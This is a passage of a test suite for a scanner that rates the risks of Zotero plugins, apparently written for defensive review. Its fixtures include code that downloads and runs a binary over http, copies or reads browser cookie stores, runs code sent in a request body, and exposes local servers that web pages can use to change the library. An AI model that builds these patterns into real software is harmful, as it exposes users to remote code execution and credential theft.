      expect(plain(r, h)).toBe(false);
    }
    expect(hostIn(r, "docs.example-fixture.org")).toBeUndefined();
  });

  it("follows a Python address through an option's default, into pip's index and out of a list's ends, not into a call after it (zotero-pdf2md)", async () => {
    const r = await scanFiles({
      "content/python/translate.py": `import argparse
import subprocess
import sys
import requests
import urllib.request
DEFAULT_API_BASE = "https://api.fixture-llm.org/v1"
def _chat(api_base, payload):
    req = urllib.request.Request(api_base.rstrip("/") + "/chat/completions", data=payload)
    return urllib.request.urlopen(req).read()
def install(packages):
    subprocess.run([sys.executable, "-m", "pip", "install", "-i", "https://pypi.fixture-mirror.org/simple", *packages])
    cmd = [sys.executable, "-m", "pip", "install", "--index-url", "https://wheels.fixture-mirror.org/simple"]
    subprocess.run(cmd + packages)
def notify(msg):
    url = "https://hooks.fixture-llm.org/send"
    requests.post(url, json=msg)
    print_help("https://help.fixture-docs.org/errors")
    for hook in ["https://first.fixture-llm.org/send", "https://last.fixture-llm.org/send"]:
        requests.post(hook, json=msg)
def parse():
    parser = argparse.ArgumentParser()
    parser.add_argument("--api-base", default=DEFAULT_API_BASE)
    parser.add_argument(
        "--upload",
        default="https://upload.fixture-llm.org/files",
    )
    parser.add_argument("--homepage", default="https://home.fixture-docs.org/")
    return parser.parse_args()
def main():
    args = parse()
    print(args.homepage)
    _chat(api_base=args.api_base, payload=b"")
    requests.post(args.upload, files={"f": open("x", "rb")})
`,
      "content/a.js": `Subprocess.call({ command: "python", arguments: [script] });`,
    });
    for (const h of [
      "api.fixture-llm.org",
      "upload.fixture-llm.org",
      "pypi.fixture-mirror.org",
      "wheels.fixture-mirror.org",
      "hooks.fixture-llm.org",
      "first.fixture-llm.org",
      "last.fixture-llm.org",
    ])
      expect(hostIn(r, h)?.usage).toBe("request");
    // An option read only to print it, and an address handed to a call after the assignment that
    // reaches a request, are names.
    for (const h of ["home.fixture-docs.org", "help.fixture-docs.org"])
      expect(hostIn(r, h)?.usage).toBe("unknown");
  });

  it("says a downloaded program comes over http when its base address is set in another file (zotero-file)", async () => {
    const r = await scanFiles({
      "content/pdfAnnotations.js": `Zotero.ZotFile.pdfAnnotations = new function () { this.popplerExtractorBaseURL = "http://www.zotfile.fixture.com/PDFTools/"; };`,
      "content/options.js": `var downloadPDFTool = function () {
          var fileName = this.pdfAnnotations.popplerExtractorFileName;
          var url = this.pdfAnnotations.popplerExtractorBaseURL + fileName + ".zip";
          var download = Downloads.createDownload({ source: url, target: file });
          download.then((d) => d.start().then(() => {
            Zotero.Utilities.Internal.exec("/usr/bin/unzip", [zip]);
            Subprocess.call({ command: "/bin/chmod", arguments: ["755", bin] });
            Subprocess.call({ command: bin, arguments: [pdf] }); })); };`,
    });
    expect(capIn(r, "download-exec")?.details?.sources).toEqual(["www.zotfile.fixture.com (http)"]);
    expect(plain(r, "www.zotfile.fixture.com")).toBe(true);
  });
});

describe("card details from the third precision check", () => {
  it("doesn't take an XML namespace handed to a DOM …NS method for an address (zotero-validate)", async () => {
    const r = await scanFiles({
      "content/a.js": `const doi = entry.getElementsByTagNameNS("http://arxiv.fixture-ns.org/schemas/atom", "doi")[0];
        const svg = doc.createElementNS("http://svg.fixture-ns.org/2000/svg", "svg");
        const p = node.lookupPrefix("http://prefix.fixture-ns.org/ns");
        a.setAttributeNS("http://xlink.fixture-ns.org/1999/xlink", "href", "https://docs.fixture-link.org/page");
        fetch("https://export.fixture-api.org/api/query");`,
    });
    for (const h of [
      "arxiv.fixture-ns.org",
      "svg.fixture-ns.org",
      "prefix.fixture-ns.org",
      "xlink.fixture-ns.org",
    ])
      expect(hostIn(r, h)).toBeUndefined();
    // The attribute's value is still an address.
    expect(hostIn(r, "docs.fixture-link.org")).toBeDefined();
  });

  it("doesn't count example addresses in a settings field's placeholder or help text (zotero-pdf-translate--thejieee)", async () => {
    const r = await scanFiles({
      "content/scripts/l10n.js": `var STRINGS = {
          "prefs.openai.hint": "Shortcuts: Base URL https://api.fixture-example.org/v1 · http://localhost:11434/v1",
          "prefs.openai.baseURL": "Base URL" };`,
      "content/prefs.js": `const field = { id: "mysearch-base", placeholder: "http://127.0.0.1:8000" };
        input.placeholder = "https://placeholder.fixture-example.org/v1";
        box.setAttribute("placeholder", "https://attr.fixture-example.org/v1");
        const hints = { baseUrlHint: "https://hint.fixture-example.org" };
        const cfg = { baseUrl: "https://api.fixture-used.org/v1" };
        fetch(cfg.baseUrl + "/chat", { method: "POST" });`,
    });
    for (const h of [
      "api.fixture-example.org",
      "localhost",
      "127.0.0.1",
      "placeholder.fixture-example.org",
      "attr.fixture-example.org",
      "hint.fixture-example.org",
    ])
      expect(hostIn(r, h)).toBeUndefined();
    expect(hostIn(r, "api.fixture-used.org")?.usage).toBe("request");
  });

  it("reads Zotero's own API base in a request's address as api.zotero.org (beaver-zotero)", async () => {
    const zfs = await scanFiles({
      "content/a.js": `function getZoteroConfig() {
          return ChromeUtils.importESModule("resource://zotero/config.mjs").ZOTERO_CONFIG; }
        async function downloadFromZFS(item, uid) {
          const apiKey = await Zotero.Sync.Data.Local.getAPIKey();
          const baseApiUrl = getZoteroConfig().API_URL;
          const apiUrl = item.library.isGroup
            ? \`\${baseApiUrl}groups/\${item.library.id}/items/\${item.key}/file\`
            : \`\${baseApiUrl}users/\${uid}/items/\${item.key}/file\`;
          return Zotero.HTTP.request("GET", apiUrl, { headers: { "Zotero-API-Key": apiKey } }); }`,
    });
    expect(hostIn(zfs, "api.zotero.org")?.usage).toBe("request");
    const direct = await scanFiles({
      "content/a.js": `const { ZOTERO_CONFIG } = ChromeUtils.importESModule("resource://zotero/config.mjs");
        fetch(ZOTERO_CONFIG.API_URL + "keys/current");
        Zotero.HTTP.request("GET", \`\${Zotero.Sync.Runner.baseURL}users/1/items\`);`,
    });
    expect(hostIn(direct, "api.zotero.org")?.usage).toBe("request");
    // Another configuration's API_URL isn't Zotero's.
    const other = await scanFiles({
      "content/a.js": `const base = PLUGIN_CONFIG.API_URL; fetch(base + "/v1/chat");`,
    });
    expect(hostIn(other, "api.zotero.org")).toBeUndefined();
  });

  it("doesn't take a session ID it makes up itself for a stored credential (openclaw-zotero-channel)", async () => {
    const made = await scanFiles({
      "content/a.js": `function getOrCreateSessionId() {
          const prefsKey = "extensions.fixture.chat.session_id";
          let sessionId = Zotero.Prefs.get(prefsKey);
          if (!sessionId || sessionId.trim() === "") {
            const uuid = crypto.randomUUID();
            sessionId = uuid.substring(0, 8);
            Zotero.Prefs.set(prefsKey, sessionId);
          }
          return sessionId; }
        function newSession() { Zotero.Prefs.set("extensions.fixture.sessionId", Zotero.Utilities.randomString(12)); }`,
    });
    expect(capIn(made, "credential-storage")).toBeUndefined();
    // One a server hands out signs the user in.
    const issued = await scanFiles({
      "content/a.js": `async function login() {
          const resp = await fetch(u).then((r) => r.json());
          Zotero.Prefs.set("extensions.fixture.session_id", resp.session_id); }`,
    });
    expect(capIn(issued, "credential-storage")?.details?.prefKeys).toEqual([
      "extensions.fixture.session_id",
    ]);
  });

  it("names the program a launch runs when its path is written far from it (zotero-pdf-hand-catcher)", async () => {
    const r = await scanFiles({
      "content/a.js": `var EDGE_CANDIDATES = [
          "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe",
          "C:\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"];
        function findEdgePath() {
          for (const candidate of EDGE_CANDIDATES) { if (exists(candidate)) return candidate; }
          return null; }
        ${"// Nothing in these lines names a program.\n".repeat(20)}
        function launchProcess(exePath, args) {
          const file = Cc["@mozilla.org/file/local;1"].createInstance(Ci.nsIFile);
          file.initWithPath(exePath);
          const process = Cc["@mozilla.org/process/util;1"].createInstance(Ci.nsIProcess);
          process.init(file);
          process.run(false, args, args.length);
          return process; }
        class Catcher {
          async launchEdge(edgePath, url) { this.proc = launchProcess(edgePath, ["--new-window", url]); }
          async open(url) { const edgePath = findEdgePath(); if (!edgePath) return; await this.launchEdge(edgePath, url); } }
        const candidate = "not a program";
        for (const candidate of ["one", "two"]) log(candidate);`,
    });
    expect(capIn(r, "process-launch")?.details?.programs).toEqual(["msedge"]);
  });

  it("names the programs a PATH search hands a launch (paperviewzoteroplugin)", async () => {
    const r = await scanFiles({
      "content/a.js": `function runProcess(exePath, args) {
          return new Promise((resolve) => {
            const file = createLocalFile(exePath);
            const proc = Cc["@mozilla.org/process/util;1"].createInstance(Ci.nsIProcess);
            proc.init(file);
            proc.runAsync(args, args.length, { observe() { resolve(proc.exitValue); } }, false); }); }
        async function runProcessChecked(exePath, args) { return runProcess(exePath, args); }
        ${"// Nothing in these lines names a program.\n".repeat(20)}
        async function findExecutable(candidates) {
          for (const dir of dirs) for (const name of candidates) if (exists(dir, name)) return join(dir, name);
          return null; }
        async function ensureEnvReady() {
          const candidates = isWindows() ? ["python", "py"] : ["python3", "python"];
          const pythonExe = await findExecutable(candidates);
          await runProcessChecked(pythonExe, ["-m", "venv", envDir]); }`,
    });
    expect(capIn(r, "process-launch")?.details?.programs).toEqual(["py", "python", "python3"]);
  });

  it("doesn't call launches system openers from a command resolved in one branch only (pdf2zh-desktop)", async () => {
    const pad = "// Nothing in these lines names a program.\n".repeat(20);
    const oneBranch = await scanFiles({
      "content/a.js": `async function launch(file) {
          var command;
          if (Zotero.isMac) command = "/usr/bin/open";
          else command = appDir + "\\\\core\\\\runtime\\\\pythonw.exe";
          ${pad}
          await Subprocess.call({ command: command, arguments: [file] }); }`,
    });
    expect(capIn(oneBranch, "process-launch")?.details?.apis).not.toContain("system openers only");
    // A resolved command that isn't an opener outweighs openers written nearby (a shipped binary).
    const binary = await scanFiles({
      "content/a.js": `async function contactSheet(dir) {
          const binaryPath = PathUtils.join(dir, "contactsheet");
          ${pad}
          await Subprocess.call({ command: binaryPath, arguments: [] }); }
        async function preview(f) { await Subprocess.call({ command: "/usr/bin/qlmanage", arguments: ["-p", f] }); }`,
    });
    expect(capIn(binary, "process-launch")?.details?.apis).not.toContain("system openers only");
    expect(capIn(binary, "process-launch")?.details?.programs).toEqual([
      "contactsheet",
      "qlmanage",
    ]);
  });

  it("says when a package install waits for an already-installed check (paperviewzoteroplugin)", async () => {
    const launch = `Subprocess.call({ command: p, arguments: [] });`;
    const once = await scanFiles({
      "content/a.js": `async function ensureEnvReady() {
          if (!fileExists(envPython)) {
            await runProcessChecked(envPython, ["-m", "pip", "install", "requests"]);
          } else log("venv exists; skip install"); } ${launch}`,
    });
    expect(capIn(once, "package-run")?.details).toMatchObject({ pinning: "unpinned", once: true });
    const early = await scanFiles({
      "content/a.js": `async function setup() {
          if (await IOUtils.exists(venvPython)) return;
          await runProcess(venvPython, ["-m", "pip", "install", "requests"]); } ${launch}`,
    });
    expect(capIn(early, "package-run")?.details?.once).toBe(true);
    // …or in the caller (zotero-notebooklm), at every call.
    const caller = await scanFiles({
      "content/a.js": `class Backend {
          async start(py) {
            const depsOk = await this.checkDependencies(py);
            if (!depsOk) {
              this.setStatus("installing-deps");
              await this.installDependencies(py);
            } }
          async installDependencies(py) { await this.runCommand(py, ["-m", "pip", "install", "fastapi"]); } } ${launch}`,
    });
    expect(capIn(caller, "package-run")?.details?.once).toBe(true);
    // Every run, or behind a test for something else: each time.
    const each = await scanFiles({
      "content/a.js": `async function ensureEnvReady() {
          if (useProxy) await runProcessChecked(envPython, ["-m", "pip", "install", "requests"]); } ${launch}`,
    });
    expect(capIn(each, "package-run")?.details?.pinning).toBe("unpinned");
    expect(capIn(each, "package-run")?.details?.once).toBeUndefined();
  });

  it("tells a browser store copied into a browser it starts from its own database (zotero-pdf-hand-catcher)", async () => {
    const copy = await scanFiles({
      "content/a.js": `function stripCookies(cookiesDbPath) {
          const db = Services.storage.openDatabase(pathToFile(cookiesDbPath));
          db.executeSimpleSQL("DELETE FROM cookies WHERE name = 'cf_clearance'"); }
        function copyRealEdgeCookies(profile) {
          const real = \`\${getLocalAppDataPath()}\\\\Microsoft\\\\Edge\\\\User Data\`;
          copyFile(\`\${real}\\\\Default\\\\Network\\\\Cookies\`, \`\${profile}\\\\Default\\\\Network\\\\Cookies\`);
          stripCookies(\`\${profile}\\\\Default\\\\Network\\\\Cookies\`); }
        function launchEdge(profile, url) {
          copyRealEdgeCookies(profile);
          Subprocess.call({ command: edge, arguments: [\`--user-data-dir=\${profile}\`, url] }); }`,
    });
    expect(capIn(copy, "own-database")).toBeUndefined();
    expect(capIn(copy, "browser-credentials")?.details).toMatchObject({
      apis: ["Microsoft Edge"],
      copiedToBrowser: true,
    });
    // Read by the plugin itself; and a database file of its own is still its own.
    const read = await scanFiles({
      "content/a.js": `function readChrome() {
          const path = \`\${home}/Library/Application Support/Google/Chrome/Default/Network/Cookies\`;
          const db = Services.storage.openUnsharedDatabase(pathToFile(path));
          return db.createStatement("SELECT name, encrypted_value FROM cookies"); }
        function notes() { return Services.storage.openDatabase(pathToFile(join(dir, "notes.db"))); }`,
    });
    expect(capIn(read, "browser-credentials")?.details?.copiedToBrowser).toBeUndefined();
    expect(capIn(read, "own-database")).toBeDefined();
  });

  it("says whether it hands a companion PDF files or text, and whether without a click (C39)", async () => {
    const auto = await scanFiles({
      "bootstrap.js": `function startup() {
          Zotero.Notifier.registerObserver({ notify: async (event, type, ids) => {
            for (const id of ids) await uploadAnnotation(Zotero.Items.get(id)); } }, ["item"]); }
        async function uploadAnnotation(item) { const path = await imagePath(item); return piclistUpload(path); }
        function piclistUpload(filePath) {
          Zotero.debug("sending to PicList");
          return fetch("http://127.0.0.1:36677/upload", { method: "POST", body: JSON.stringify({ list: [filePath] }) }); }`,
    });
    expect(auto.analysis.network.programs).toEqual([
      expect.objectContaining({ program: "PicList", category: "unknown", automatic: true }),
    ]);
    expect(auto.analysis.network.programs?.[0]?.documents).toBeUndefined();
    const docs = await scanFiles(
      {
        "content/a.js": `const BRIDGE = "http://127.0.0.1:8766";
          async function translate(item) {
            const text = await Zotero.PDFWorker.getFullText(item.id);
            return fetch(BRIDGE + "/translate", { method: "POST", body: text }); }`,
      },
      {
        manifest: {},
        rawManifest: manifestJson(
          {},
          { description: "Send papers to a local TeXGlot service for translation." },
        ),
      },
    );
    expect(docs.analysis.network.programs).toEqual([
      expect.objectContaining({ program: "TeXGlot", category: "unknown", documents: true }),
    ]);
    expect(docs.analysis.network.programs?.[0]?.automatic).toBeUndefined();
  });
});

describe("servers a plugin runs itself (C3)", () => {
  const own = (r: ScanOutput) => capIn(r, "own-server");
  const concern = (r: ScanOutput) =>
    r.card.capabilities.find((c) => c.id === "own-server")?.concern;
  // An MCP server on its own socket (zotero-mcp-tags), with a UI listener of the same name nearby.
  // The item comes by its number, which a website can guess (by its key: see the follow-ups).
  const socketServer = (
    check = "",
    tool = "item.addTag(args.tag); await item.saveTx();",
    find = "Zotero.Items.get(args.itemID)",
  ) => `
    const ui = { listener: (ev) => ev.target.click() };
    class HttpServer {
      start(port) {
        this.token = crypto.randomUUID();
        this.serverSocket = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket);
        this.serverSocket.init(port, true, -1);
        this.serverSocket.asyncListen(this.listener);
      }
      listener = {
        onSocketAccepted: async (_socket, transport) => {
          const text = await readRequest(transport);
          ${check}
          const body = text.slice(text.indexOf("\\r\\n\\r\\n") + 4);
          writeReply(transport, await this.handleRequest(JSON.parse(body)));
        },
      };
      async handleRequest(req) {
        if (req.method === "tools/call" && req.params.name === "add_tag") return addTag(req.params.arguments);
        return { error: "unknown tool" };
      }
    }
    async function addTag(args) { const item = ${find}; ${tool} return { ok: true }; }
    function readRequest(t) { return ""; }
    function writeReply(t, r) {}
    function extractOriginHeader(text) { const m = text.match(/^Origin:[ \\t]*(\\S+)/im); return m ? m[1] : null; }
    function isOriginAllowed(origin) { return origin === null || /^http:\\/\\/127\\.0\\.0\\.1(:\\d+)?$/.test(origin); }
    function extractBearerToken(text) { const m = text.match(/^Authorization: Bearer (\\S+)/im); return m ? m[1] : null; }
    function tokensMatch(a, b) { return a === b; }
    new HttpServer().start(23124);`;

  it("rates a server any website can make change the library high", async () => {
    const open = await scanFiles({ "content/server.js": socketServer() });
    expect(own(open)?.details).toMatchObject({ web: "any", serverActions: ["changes-library"] });
    expect(concern(open)).toBe("high");
    expect(open.card.label).toBe("high-concern");
    // A Host check doesn't stop a page: its request to 127.0.0.1 names 127.0.0.1 itself.
    const host = await scanFiles({
      "content/server.js": socketServer(
        `if (!/^Host: 127\\.0\\.0\\.1/m.test(text)) return writeReply(transport, { status: 403 });`,
      ),
    });
    expect(concern(host)).toBe("high");
  });

  it("leaves a server that checks the Origin header or a secret token at low", async () => {
    const origin = await scanFiles({
      "content/server.js": socketServer(
        `const origin = extractOriginHeader(text); if (!isOriginAllowed(origin)) return writeReply(transport, { status: 403 });`,
      ),
    });
    expect(own(origin)?.details?.web).toBeUndefined();
    expect(concern(origin)).toBe("low");
    const token = await scanFiles({
      "content/server.js": socketServer(
        `const provided = extractBearerToken(text); if (!tokensMatch(provided, this.token)) return writeReply(transport, { status: 401 });`,
      ),
    });
    expect(concern(token)).toBe("low");
    // Refusing bodies that aren't JSON needs a preflight, which it doesn't answer…
    const json = await scanFiles({
      "content/server.js": socketServer(
        `const type = headerOf(text, "content-type") || ""; if (!type.startsWith("application/json")) return writeReply(transport, { status: 400 });`,
      ),
    });
    expect(concern(json)).toBe("low");
    // …unless it answers every page (zotero-filelink-bridge's Access-Control-Allow-Origin: *).
    const cors = await scanFiles({
      "content/server.js": socketServer(
        `const type = headerOf(text, "content-type") || ""; if (!type.startsWith("application/json")) return writeReply(transport, { status: 400 });`,
      ).concat(
        `\nconst CORS = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Content-Type" };`,
      ),
    });
    expect(concern(cors)).toBe("high");
    // Echoing the Origin back in a CORS header lets every site in: it isn't a check.
    const echo = await scanFiles({
      "content/server.js": socketServer(
        `let allow = "*"; const originLine = text.split("\\r\\n").find((l) => l.toLowerCase().startsWith("origin:")); if (originLine) allow = originLine.split(": ")[1];`,
      ),
    });
    expect(concern(echo)).toBe("high");
  });

  it("doesn't take a check on an item's authors, or on object keys, for a secret", async () => {
    const authors = await scanFiles({
      "content/server.js": socketServer(
        `if (!checkAuthors(text) || keysEqual(a, b)) return writeReply(transport, { status: 400 });`,
      ),
    });
    expect(concern(authors)).toBe("high");
    // …while a helper named for authorisation is one.
    const authorised = await scanFiles({
      "content/server.js": socketServer(
        `if (!isAuthorized(text)) return writeReply(transport, { status: 401 });`,
      ),
    });
    expect(concern(authorised)).toBe("low");
  });

  it("rates edits behind a write setting that's off by default one step lower, naming it", async () => {
    const pref = await scanFiles({
      "content/server.js": socketServer(
        "",
        `const writeEnabled = Zotero.Prefs.get("extensions.zotero.fixture.write.enabled", true);
         if (writeEnabled !== true) return { error: "writes are off" }; item.addTag(args.tag); await item.saveTx();`,
      ),
    });
    expect(own(pref)?.details).toMatchObject({
      serverActions: ["changes-library"],
      setting: "extensions.zotero.fixture.write.enabled",
    });
    expect(concern(pref)).toBe("medium");
    // …also read through a settings service with a read-only default (zotero-mcp-neo).
    const level = await scanFiles({
      "content/server.js": socketServer(
        "",
        `const writeLevel = String(MCPSettingsService.get("dangerous.writeLevel") || "readonly");
         if (writeLevel === "readonly") throw new Error("read-only"); item.addTag(args.tag); await item.saveTx();`,
      ),
    });
    expect(concern(level)).toBe("medium");
    // A setting that's on by default doesn't lower it.
    const on = await scanFiles({
      "content/server.js": socketServer(
        "",
        `if (Zotero.Prefs.get("extensions.zotero.fixture.write.enabled", true) !== true) return {}; item.addTag(args.tag); await item.saveTx();`,
      ),
      "prefs.js": `pref("extensions.zotero.fixture.write.enabled", true);`,
    });
    expect(concern(on)).toBe("high");
  });

  it("finds code a server runs, and the method of an instance whose class it knows", async () => {
    // zoty: POST /execute runs the body in Zotero.
    const runs = await scanFiles({
      "bootstrap.js": `function handleRequest(data, output) {
          const body = data.slice(data.indexOf("\\r\\n\\r\\n") + 4);
          let code; try { code = JSON.parse(body).code; } catch (_) { code = body; }
          const fn = new Function("Zotero", "return (async () => { " + code + " })();"); fn(Zotero); }
        function startServer() {
          const serverSocket = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket);
          serverSocket.init(24119, true, -1);
          serverSocket.asyncListen({ onSocketAccepted(socket, transport) { const data = read(transport); handleRequest(data, transport.openOutputStream(0, 0, 0)); } }); }`,
    });
    expect(own(runs)?.details?.serverActions).toEqual(["runs-code"]);
    expect(capIn(runs, "runs-sent-code")?.details?.apis).toContain("web pages");
    expect(runs.card.label).toBe("high-concern");
    // zotero-resource-search-mcp: `addAction.execute()` though four classes have an execute.
    const others = ["A", "B", "C", "D"].map((n) => `class ${n}Action { execute() { return 1; } }`);
    const typed = await scanFiles({
      "content/server.js": socketServer("", `return addAction.execute(args);`).concat(`
        ${others.join("\n")}
        var AddAction = class { async execute(args) { const t = new Zotero.Translate.Search(); t.setSearch({ DOI: args.doi });
          return t.translate({ libraryID: Zotero.Libraries.userLibraryID }); } };
        var addAction = new AddAction();`),
    });
    expect(own(typed)?.details?.serverActions).toEqual(["changes-library"]);
  });

  it("reads the Remote Agent's copy of httpd.js as its own server", async () => {
    const r = await scanFiles({
      "content/bridge.js": `const { HttpServer } = ChromeUtils.importESModule("chrome://remote/content/server/httpd.sys.mjs");
        const server = new HttpServer();
        server.registerPathHandler("/trash", (request, response) => { Zotero.Items.trashTx([Number(request.queryString)]); response.write("ok"); });
        server.start(23135);`,
    });
    expect(own(r)?.details?.apis).toContain("httpd.js");
    expect(concern(r)).toBe("high");
  });

  // paperviewzoteroplugin's service: /runtime/check sends the stored key to the body's base_url.
  const pyService = (check = "") => `
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import requests

class Handler(BaseHTTPRequestHandler):
    def _load_config(self):
        return json.load(open(CONFIG))

    def _runtime_check(self, req):
        cfg = self._load_config()
        base_url = req.get("base_url") or cfg.get("base_url")
        headers = {"Authorization": f"Bearer {cfg.get('api_key')}"}
        return requests.post(f"{base_url}/chat/completions", headers=headers, json={}).status_code

    def do_POST(self):
${check}        length = int(self.headers.get("Content-Length") or 0)
        payload = json.loads(self.rfile.read(length) or b"{}")
        if self.path == "/runtime/check":
            self.wfile.write(json.dumps(self._runtime_check(payload)).encode())

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    args = parser.parse_args()
    server = ThreadingHTTPServer((args.host, 20341), Handler)
    server.serve_forever()
`;
  const launcher = `Subprocess.call({ command: "/usr/bin/python3", arguments: [rootURI + "service/local_service.py"] });`;

  it("reads a server in a Python program it runs, and what its handlers do", async () => {
    const r = await scanFiles({
      "bootstrap.js": launcher,
      "service/local_service.py": pyService(),
    });
    expect(own(r)?.details).toMatchObject({
      apis: ["Python program it runs"],
      web: "any",
      serverActions: ["sends-keys"],
    });
    expect(concern(r)).toBe("high");
    // A program it never runs isn't one of its servers.
    const shipped = await scanFiles({ "service/local_service.py": pyService() });
    expect(own(shipped)).toBeUndefined();
    // Turning away requests that carry an Origin refuses web pages (twintext's engines).
    const checked = await scanFiles({
      "bootstrap.js": launcher,
      "service/local_service.py": pyService(
        `        if self.headers.get("Origin") or self.headers.get("Sec-Fetch-Site", "none") != "none":\n            return self.send_error(403)\n`,
      ),
    });
    expect(own(checked)?.details?.web).toBeUndefined();
    expect(concern(checked)).toBe("low");
  });

  it("reads a Python server's CORS, its framework's JSON-only bodies, and where it listens", async () => {
    const fastapi = (cors: string, host = "127.0.0.1") => `
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn, sqlite3
app = FastAPI()
${cors}
class Rename(BaseModel):
    key: str
    title: str

@app.post("/rename")
def rename(req: Rename):
    db = sqlite3.connect(ZOTERO_DIR + "/zotero.sqlite")
    db.execute("UPDATE itemDataValues SET value = ? WHERE valueID = ?", (req.title, req.key))

uvicorn.run(app, host="${host}", port=8765)
`;
    const cors = await scanFiles({
      "bootstrap.js": launcher,
      "server.py": fastapi(`app.add_middleware(CORSMiddleware, allow_origins=["*"])`),
    });
    expect(own(cors)?.details?.apis).toContain("web pages can call it");
    expect(own(cors)?.details?.serverActions).toEqual(["changes-library"]);
    expect(concern(cors)).toBe("high");
    // Without CORS, a body model takes JSON only: a page can't send it without a preflight.
    const json = await scanFiles({ "bootstrap.js": launcher, "server.py": fastapi("") });
    expect(own(json)?.details?.web).toBeUndefined();
    const wide = await scanFiles({ "bootstrap.js": launcher, "server.py": fastapi("", "0.0.0.0") });
    expect(own(wide)?.details?.apis).toContain("listens beyond this computer");
  });

  it("counts a Python server's calls to Zotero's local API as a change only with a write method", async () => {
    const service = (call: string) => `
import json
from http.server import BaseHTTPRequestHandler, HTTPServer
import requests

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length") or 0)
        payload = json.loads(self.rfile.read(length) or b"{}")
        r = ${call}
        self.wfile.write(r.content)

HTTPServer(("127.0.0.1", 8765), Handler).serve_forever()
`;
    // The local API answers reads: a search doesn't change the library.
    const reads = await scanFiles({
      "bootstrap.js": launcher,
      "server.py": service(
        `requests.get("http://127.0.0.1:23119/api/users/0/items", params={"q": payload.get("q")})`,
      ),
    });
    expect(own(reads)?.details?.serverActions).toBeUndefined();
    expect(concern(reads)).toBe("low");
    const saves = await scanFiles({
      "bootstrap.js": launcher,
      "server.py": service(
        `requests.post("http://127.0.0.1:23119/connector/saveItems", json={"items": payload.get("items")})`,
      ),
    });
    expect(own(saves)?.details?.serverActions).toEqual(["changes-library"]);
  });

  it("reads a server in a Node program it runs, and whether it listens beyond this computer", async () => {
    const node = (listen: string) => ({
      "bootstrap.js": `Subprocess.call({ command: "/usr/local/bin/node", arguments: [rootURI + "proxy/server.mjs"] });`,
      "proxy/server.mjs": `import http from "node:http";
        const server = http.createServer((req, res) => { res.end("ok"); });
        ${listen}
        class Proxy { listen(port) { return port; } }
        new Proxy().listen(9000);`,
    });
    const wide = await scanFiles(node(`server.listen(8787);`));
    expect(own(wide)?.details?.apis).toEqual([
      "Node program it runs",
      "listens beyond this computer",
    ]);
    const local = await scanFiles(node(`server.listen(8787, "127.0.0.1");`));
    expect(own(local)?.details?.apis).toEqual(["Node program it runs"]);
    expect(concern(local)).toBe("low");
    // The host can come in an options object; without one there, Node takes every interface.
    const opts = await scanFiles(node(`server.listen({ port: 8787, host: "127.0.0.1" });`));
    expect(own(opts)?.details?.apis).toEqual(["Node program it runs"]);
    const optsWide = await scanFiles(node(`server.listen({ port: 8787 });`));
    expect(own(optsWide)?.details?.apis).toContain("listens beyond this computer");
  });
});

describe("review of C1-C3: keys, tokens and where a server listens", () => {
  const own = (r: ScanOutput) => capIn(r, "own-server");
  const concernOf = (r: ScanOutput, id: string) =>
    r.card.capabilities.find((c) => c.id === id)?.concern;
  // A web page can reach it (text/plain, opted in); `init` is what it does with the request.
  const endpoint = (init: string, more = "") =>
    scanFiles({
      "content/a.js": `const Note = function () {};
        Note.prototype = { supportedMethods: ["POST"], supportedDataTypes: ["text/plain"], allowRequestsFromUnsafeWebContent: true,
          async init(req) { ${init} return [200, "text/plain", "ok"]; } };
        Zotero.Server.Endpoints["/x/note"] = Note;
        ${more}`,
    });

  it("rates a change a website can make only to an item whose key it knows one step lower", async () => {
    // zotero-ai-summary: PUT overwrites a note by its key (its old images by the note's children)…
    const put =
      await endpoint(`const note = await Zotero.Items.getByLibraryAndKeyAsync(1, req.data.key);
      for (let childID of note.getAttachments()) { const child = await Zotero.Items.getAsync(childID); child.deleted = true; await child.saveTx(); }
      note.setNote(req.data.html); await note.saveTx();`);
    expect(capIn(put, "server-edits-library")?.details).toMatchObject({
      web: "any",
      needsKey: true,
    });
    expect(concernOf(put, "server-edits-library")).toBe("medium");
    // …and POST adds a note under an item named by its key.
    const post =
      await endpoint(`const parent = await Zotero.Items.getByLibraryAndKeyAsync(1, req.data.parentItem);
      const note = new Zotero.Item("note"); note.libraryID = parent.libraryID; note.parentItemID = parent.id;
      note.setNote(req.data.html); await note.saveTx();`);
    expect(concernOf(post, "server-edits-library")).toBe("medium");
    // A new item with no parent, the selected item, or an item's number (numbers count up from 1)
    // needs no key: any website can.
    for (const init of [
      `const item = new Zotero.Item("journalArticle"); item.setField("title", req.data.title); await item.saveTx();`,
      `const item = req.data.key ? Zotero.Items.getByLibraryAndKey(1, req.data.key) : Zotero.getActiveZoteroPane().getSelectedItems()[0]; item.addTag(req.data.tag); await item.saveTx();`,
      `const item = (await Zotero.Items.getAsync(Number(req.data.id))) || Zotero.Items.getByLibraryAndKey(1, req.data.key); item.addTag(req.data.tag); await item.saveTx();`,
    ]) {
      const r = await endpoint(init);
      expect(
        capIn(r, "server-edits-library")?.details?.needsKey,
        init.slice(0, 50),
      ).toBeUndefined();
      expect(concernOf(r, "server-edits-library")).toBe("high");
    }
    // An endpoint that hands library content to web pages could give the keys away.
    const listed = await endpoint(
      `const note = await Zotero.Items.getByLibraryAndKeyAsync(1, req.data.key); note.setNote(req.data.html); await note.saveTx();`,
      `Zotero.Server.Endpoints["/x/items"] = class { supportedMethods = ["GET"]; allowRequestsFromUnsafeWebContent = true;
          async init() { const items = await Zotero.Items.getAll(1); return [200, "application/json", JSON.stringify(items.map((i) => [i.key, i.getField("title")]))]; } };`,
    );
    expect(concernOf(listed, "server-edits-library")).toBe("high");
  });

  // zotero-mcp-tags: every tag tool looks the item up by its key.
  const tagServer = (find: string, more = "") => `
    class HttpServer {
      start(port) {
        this.serverSocket = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket);
        this.serverSocket.init(port, true, -1);
        this.serverSocket.asyncListen(this.listener);
      }
